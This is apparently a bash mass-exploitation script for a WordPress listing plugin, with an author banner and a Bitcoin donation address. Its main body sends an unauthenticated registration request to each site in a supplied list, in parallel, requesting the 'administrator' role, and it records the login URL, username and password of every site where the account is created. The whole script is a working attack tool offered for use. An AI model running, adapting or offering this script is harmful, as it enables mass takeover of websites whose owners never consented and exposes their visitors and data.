#!/bin/bash
# WP Plugin UIListing Mass Exploiter
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash file.sh list.txt thread 

yellow='\033[0;33m'
cat << "EOF"
  _      __            __   _     __  _          
 | | /| / /__    __ __/ /  (_)__ / /_(_)__  ___ _
 | |/ |/ / _ \  / // / /__/ (_-</ __/ / _ \/ _ `/
 |__/|__/ .__/  \_,_/____/_/___/\__/_/_//_/\_, / 
       /_/                                /___/  
EOF
printf "     Mass Exploiter\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou
Donate BTC : 3Avek8froL5sdAmzPUTDNhhpkKe21CscKP\n\n"

exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl --silent --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php?action=stm_listing_register' -d '{"email": "sinner1337man@ya.ru","first_name":"Urushihara","last_name": "Hanzou", "login": "hanzou", "password": "hanzou1337", "password_repeat":"hanzou1337","role":"administrator"}') =~ '"message":"Registration completed successfully."' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target | USER HAS BEEN ADDED] \n";
    printf "Url: $target/wp-login.php\nUsername: hanzou\nPassword: hanzou1337\n\n" >> result.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> bad.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

printf "\033[0;36mCheck Vuln : result.txt\n";
printf "\033[0;36mBad Site : bad.txt\n";
